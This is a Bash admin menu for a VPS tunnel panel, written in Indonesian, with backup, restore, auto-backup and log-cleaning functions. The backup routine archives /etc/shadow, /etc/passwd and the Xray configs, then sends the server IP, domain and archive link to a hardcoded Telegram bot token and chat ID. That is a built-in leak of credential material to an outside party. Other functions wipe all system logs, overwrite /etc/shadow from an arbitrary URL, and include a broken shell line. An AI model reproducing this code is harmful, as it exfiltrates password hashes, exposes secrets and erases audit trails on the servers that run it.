#!/bin/bash

NC='\033[0;37m'
PURPLE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
BIWhite='\033[1;97m'  
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
clear
clear
function backup(){
clear
IP=$(curl -sS ipv4.icanhazip.com)
# Getting
CHATID="6430177985"
KEY="7567594287:AAGVeDwRq9QrNg6jSce30eOm9WiVtAWKxjA"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
IP=$(curl -sS ipv4.icanhazip.com)
domain=$(cat /etc/xray/domain)
date=$(date +"%Y-%m-%d")
clear
email=$(cat /root/email)
if [[ "$email" = "" ]]; then
clear
echo "Masukkan Email Untuk Menerima Backup"
echo -e ""
echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
read -rp "Input Your Email : " -e email
echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
cat <<EOF>>/root/email
$email
EOF
fi
clear
echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
echo -e "\033[1;92mWait Backup Procces.......\033[0m"
echo -e "\033[1;93m_____________________________________________________\033[0m" | tee -a /etc/user-create/user.log
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp /etc/crontab backup/
cp -r /var/lib/kyt/ backup/kyt 
cp -r /etc/xray backup/xray
cp -r /var/www/html/ backup/html
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="
<code>◇━━━━━━━━━━━━━━◇</code>
<b>   ⚠️BACKUP NOTIF⚠️</b>
<b>     Detail Backup VPS</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>IP VPS  :</b> <code>${IP} </code>
<b>DOMAIN :</b> <code>${domain}</code>
<b>Tanggal : $date</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>Link Backup   :</b> $link
<code>◇━━━━━━━━━━━━━━◇</code>
<code>Silahkan copy Link dan restore di VPS baru</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""
read -n 1 -s -r -p "Press any key to back on menu"

    menu-backup

}

function restore(){
clear
echo "Silahkan Masukin Link Backupnya"
read -rp "Link File: " -e url
wget -O backup.zip "$url"
unzip backup.zip
rm -f backup.zip
sleep 1
echo Start Restore
cd /root/backup
cp passwd /etc/
cp group /etc/
cp shadow /etc/
cp gshadow /etc/
cp -r kyt /var/lib/
cp -r xray /etc/
cp -r html /var/www/
cp crontab /etc/

notif_restore
rm -rf /root/backup
rm -f backup.zip
echo ""
    read -n 1 -s -r -p "Press any key to back on menu"
    menu-backup
}

function autobackup(){
clear
if [ ! -e /usr/local/bin/backup_otomatis ]; then
#!/bin/bash' > /usr/local/bin/backup_otomatis 
echo 'tanggal=$(date +"%m-%d-%Y")' >> /usr/local/bin/backup_otomatis 
echo 'waktu=$(date +"%T")' >> /usr/local/bin/backup_otomatis 
echo 'echo "Sucsesfully Backup On $tanggal Time $waktu." >> /root/log-backup.txt' >> /usr/local/bin/backup_otomatis 
echo '/usr/local/sbin/backer -r now' >> /usr/local/bin/backup_otomatis 
chmod +x /usr/local/bin/backup_otomatis
fi
clear
echo -e ""
echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;93m│$NC\033[42m           MENU MANAGER AUTOBACKUP        $NC"
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;93m│  ${green}1.${NC} \033[0;36mSet Auto-Backup 1 Hour Period"
echo -e "\033[1;93m│  ${green}2.${NC} \033[0;36mSet Auto-Backup 6 Hour Period"
echo -e "\033[1;93m│  ${green}3.${NC} \033[0;36mSet Auto-Backup 12 Hour Period"
echo -e "\033[1;93m│  ${green}4.${NC} \033[0;36mSet Auto-Backup 1 Day Period"
echo -e "\033[1;93m│  ${green}5.${NC} \033[0;36mSet Auto-Backup 1 Week Period"
echo -e "\033[1;93m│  ${green}6.${NC} \033[0;36mSet Auto-Backup 1 Month Period"
echo -e "\033[1;93m│  ${green}7.${NC} \033[0;36mDeactivate Auto-Backup"
echo -e "\033[1;93m│  ${green}8.${NC} \033[0;36mSee Backup Log"
echo -e "\033[1;93m│  ${green}9.${NC} \033[0;36mDelete Backup Log"
echo -e "\033[1;93m│  $NC "
echo -e "\033[1;93m│  ${green}0.${NC} \033[0;36mBACK TO EXIT MENU \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m$NC \E[0m\033[0;34m "
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
echo
read -p " Select menu : " opt
echo -e ""
case $opt in
1 | 01)
clear
echo "57 * * * * root /usr/local/bin/backup_otomatis" > /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully Set\e[32m1 Hour Period\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
2 | 02)
clear
echo "10 */6 * * * root /usr/local/bin/backup_otomatis" > /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully Set \e[32m6 Hour Period\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
3 | 03)
clear
echo "10 */12 * * * root /usr/local/bin/backup_otomatis" > /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully Set \e[32m12 Hour Period\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
4 | 04)
clear
echo "0 0 * * * root /usr/local/bin/backup_otomatis" > /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully Set \e[32m1 Day Period\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
5 | 05)
clear
echo "10 0 */7 * * root /usr/local/bin/backup_otomatis" > /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully Set \e[32m1 Week Period\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
6 | 06)
clear
echo "10 0 1 * * root /usr/local/bin/backup_otomatis" > /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully Set \e[32m1 Month Period\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
7 | 07)
clear
rm -f /etc/cron.d/backup_otomatis
echo -e "Auto-Backup Sucsesfully \e[31mDeactivated ..!\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
8 | 08)
clear
if [ ! -e /root/log-backup.txt ]; then
	echo "No Activity Found"
  echo -e "\033[1;93m======================================\033[0m"
	else 
	#echo ' LOG BACKUP |'
	echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
echo -e "\033[1;93m│$NC\033[42m               LOG TIME BACKUP            $NC"
echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
	echo -e "\033[1;93m┌──────────────────────────────────────────┐\033[0m"
cat /root/log-backup.txt
 echo -e "\033[1;93m└──────────────────────────────────────────┘\033[0m"
 echo -e "\033[1;93m======================================\033[0m"
fi
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
9 | 09)
clear
echo "" > /root/log-backup.txt
echo -e "Auto backup Log Sucsesfully \e[31mDeleted ..!\e[0m"
echo -e "\033[1;93m======================================\033[0m"
read -n 1 -s -r -p "Press any key to back on menu"
autobackup
;;
0 | 00)
clear
menu
;;
x)
exit
;;
*)
echo -e ""
autobackup
;;
esac
read -n 1 -s -r -p "Press any key to back on menu"

menu-backup
}

function clean() {
clear
#!/bin/bash

clear
data=(`find /var/log/ -name '*.log'`);
for log in "${data[@]}"
do
echo "$log clear"
echo > $log
done
data=(`find /var/log/ -name '*.err'`);
for log in "${data[@]}"
do
echo "$log clear"
echo > $log
done
data=(`find /var/log/ -name 'mail.*'`);
for log in "${data[@]}"
do
echo "$log clear"
echo > $log
done
echo > /var/log/syslog
echo > /var/log/btmp
echo > /var/log/messages
echo > /var/log/debug
bcc=`date`
echo ""
echo "Successfully clean log at $bcc"
sleep 0.5
clear
echo ""

    read -n 1 -s -r -p "Press any key to back on menu"
    menu-backup
    
}
clear
echo -e "$PURPLE┌─────────────────────────────────────────────────┐${NC}"
echo -e "$PURPLE│\e[1;97;101m               Menu Backup Data                  $PURPLE│$NC"
echo -e "$PURPLE└─────────────────────────────────────────────────┘${NC}"
echo -e " $PURPLE┌───────────────────────────────────────────────┐${NC}"
echo -e "     ${GREEN}[${BIWhite}1${GREEN}] ${NC}Backup Data      "
echo -e "     ${GREEN}[${BIWhite}2${GREEN}] ${NC}Restore Data     "
echo -e "     ${GREEN}[${BIWhite}3${GREEN}] ${NC}Auto Backup Data      "
echo -e "     ${GREEN}[${BIWhite}4${GREEN}] ${NC}Cleaner Data      "
echo -e "     ${GREEN}[${BIWhite}0${GREEN}] Back To Menu     "
echo -e " "
echo -e "     \e[1;97;101m✶ Upload By Arya Blitar 081931615811 ✶ ${NC} "
echo -e " ${PURPLE}└──────────────────────────────────────────────┘${NC}"
echo ""
read -p " Select menu : " opt
echo -e ""
case $opt in
1) clear ; backup ;;
2) clear ; restore ;;
3) clear ; autobackup ;;
4) clear ; clean ;;
0) clear ; menu ;;
x) exit ;;
*) echo -e "" ; echo "Press any key to back on menu" ; sleep 1 ; menu ;;
esac
 menu-backup.temp1.sh 